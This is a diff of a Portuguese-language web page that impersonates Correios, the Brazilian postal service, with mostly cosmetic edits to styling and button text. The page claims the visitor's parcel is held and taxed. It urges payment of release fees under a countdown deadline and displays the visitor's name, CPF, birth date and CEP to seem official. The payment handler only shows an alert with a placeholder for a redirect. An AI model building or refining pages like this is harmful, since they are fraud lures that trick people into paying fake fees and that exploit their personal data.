@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
+
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
@@ -206,27 +207,27 @@
       margin: 0 auto;
     }
 
-    /* Resultado - removida a sombra */
+    /* Resultado */
     #resultado {
       background: #f0f0f0;
       border-radius: 8px;
       padding: 2rem;
       font-family: Arial, sans-serif;
       color: #003157;
-      /* box-shadow removido */
+      box-shadow: 0 0 10px rgb(0 0 0 / 0.1);
       text-align: center;
       max-width: 700px;
       margin: 2rem auto;
       display: none;
     }
 
-    /* Pagamento - removida a sombra */
+    /* Pagamento */
     #pagamento {
       background: #ffffff;
       border-radius: 8px;
       padding: 2rem;
       font-family: Arial, sans-serif;
-      /* box-shadow removido */
+      box-shadow: 0 0 10px rgb(0 0 0 / 0.1);
       text-align: center;
       max-width: 700px;
       margin: 2rem auto;
@@ -264,7 +265,6 @@
     }
     
     .status-value {
-      /* Adiciona emoji amarelo antes do texto */
       color: #ffc107;
       font-weight: bold;
     }
@@ -294,8 +294,7 @@
     /* Botão sim sou eu */
     #btn-sim-sou-eu, #btn-pagar {
       margin-top: 1.5rem;
-      /* Botão mais fino: padding reduzido */
-      padding: 0.4rem 1rem;
+      padding: 0.6rem 1.5rem;
       font-size: 1.1rem;
       background-color: #007bff;
       color: white;
@@ -463,17 +462,14 @@
       <div class="alert-title">❗ SUA ENCOMENDA FOI TRIBUTADA!</div>
       
       <div class="status-label">STATUS DA ENTREGA:</div>
-      <!-- Adicionado o emoji 🟡 antes da mensagem -->
-      <div class="status-value">🟡 AGUARDANDO SUA CONFIRMAÇÃO</div>
+      <div class="status-value">AGUARDANDO SUA CONFIRMAÇÃO</div>
       
-      <!-- Texto com cor azul claro -->
-      <p class="normal-text" style="color: #add8e6;">Sua encomenda está retida na agência dos Correios em São Paulo</p>
+      <p class="normal-text">Sua encomenda está retida na agência dos Correios em São Paulo</p>
       
       <p class="normal-text">Para prosseguir com o processo de liberação e entrega da sua encomenda, é necessário efetuar o pagamento das taxas aplicáveis. Por favor, utilize o botão abaixo para realizar o procedimento de forma segura:</p>
       
       <div class="btn-container">
-        <!-- Alterado o texto do botão e aplicado o estilo mais fino -->
-        <button id="btn-pagar">CLIQUE AQUI PARA LIBERAÇÃO DO SEU PEDIDO</button>
+        <button id="btn-pagar">Efetuar Pagamento</button>
         <p>Objeto aguardando sua confirmação</p>
         <p>em Unidade de Fiscalização em São Paulo</p>
         <p>Objeto em transferência - por favor aguarde</p>
@@ -561,11 +557,11 @@
 
       document.getElementById(
         "res-prazo"
-      ).textContent = ${dd}/${mm}/${yyyy} às 23:59 (Tempo restante: ${horas
+      ).textContent = `${dd}/${mm}/${yyyy} às 23:59 (Tempo restante: ${horas
         .toString()
         .padStart(2, "0")}:${minutos.toString().padStart(2, "0")}:${segundos
         .toString()
-        .padStart(2, "0")});
+        .padStart(2, "0")})`;
     }
 
     let intervalContagem;
@@ -609,7 +605,8 @@
 
         document.getElementById("res-nome").textContent = dadosPessoa.nome;
         document.getElementById("res-cpf").textContent = dadosPessoa.cpf;
-        document.getElementById("res-nascimento").textContent = dadosPessoa.nascimento;
+        document.getElementById("res-nascimento").textContent =
+          dadosPessoa.nascimento;
         document.getElementById("res-cep").textContent = dadosPessoa.cep;
 
         // Deixa rua e bairro vazios
@@ -647,11 +644,12 @@
       document.getElementById("resultado").style.display = "block";
     });
     
-    // Script para o botão "Efetuar Pagamento" - agora com novo texto
+    // Script para o botão "Efetuar Pagamento"
     document.getElementById("btn-pagar").addEventListener("click", function() {
       alert("Redirecionando para página de pagamento...");
       // Aqui você pode adicionar o redirecionamento real para a página de pagamento
     });
   </script>
 </body>
+
 </html>
